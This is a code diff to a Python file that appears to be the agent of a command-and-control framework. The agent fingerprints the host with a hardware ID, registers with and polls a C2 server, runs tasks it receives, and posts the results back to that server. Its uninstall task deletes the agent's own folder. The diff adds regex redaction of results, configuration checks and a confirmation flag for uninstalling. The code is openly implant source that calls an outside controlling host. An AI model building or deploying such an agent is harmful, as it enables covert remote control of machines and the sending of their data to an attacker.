@@ -1,16 +1,30 @@
-import asyncio, json, os, platform, hashlib, time, uuid, base64, sys
+import asyncio, json, os, platform, hashlib, time, uuid, base64, sys, re
 from crypto import decrypt, generate_keypair
 import httpx
 
 C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
 INTERVAL = 30
 EGRESS_STRATEGY = os.getenv("EGRESS_STRATEGY", "auto")
+REDACT_PATTERNS = os.getenv("REDACT_PATTERNS", "")
+_redact_re = re.compile(REDACT_PATTERNS, re.IGNORECASE) if REDACT_PATTERNS else None
 
 try:
     from orchestrator.egress.router import EgressRouter
     _router = EgressRouter(strategy=EGRESS_STRATEGY)
 except ImportError:
     _router = None
+
+def _validate_config():
+    if not C2_URL.startswith(("http://", "https://")):
+        raise RuntimeError(f"Invalid C2_URL: {C2_URL}")
+    hwid = asyncio.run(get_hwid())
+    if len(hwid) < 8:
+        raise RuntimeError(f"HWID too short ({len(hwid)} chars), collision risk")
+
+def _redact(text: str) -> str:
+    if _redact_re:
+        return _redact_re.sub("[REDACTED]", text)
+    return text
 
 async def get_hwid() -> str:
     data = ""
@@ -69,6 +83,9 @@ async def execute_task(task: dict) -> dict:
         await asyncio.sleep(payload.get("duration", 3600))
         return {"slept": True}
     elif ttype == "uninstall":
+        confirm = payload.get("confirm_uninstall", False)
+        if not confirm:
+            return {"error": "uninstall requires confirm_uninstall: true"}
         import shutil
         try:
             shutil.rmtree(os.path.dirname(os.path.abspath(__file__)), ignore_errors=True)
@@ -78,12 +95,14 @@ async def execute_task(task: dict) -> dict:
     return {"error": f"unknown task type: {ttype}"}
 
 async def submit_result(agent_id: str, session_key: bytes, task_id: str, result: dict):
+    redacted = {k: (_redact(v) if isinstance(v, str) else v) for k, v in result.items()}
     async with (_router.get_client() if _router else httpx.AsyncClient()) as client:
         await client.post(f"{C2_URL}/v1/agent/result", json={
-            "agent_id": agent_id, "task_id": task_id, "result": result,
+            "agent_id": agent_id, "task_id": task_id, "result": redacted,
         })
 
 async def main():
+    _validate_config()
     agent_id, session_key = await register()
     while True:
         tasks = await heartbeat(agent_id, session_key)
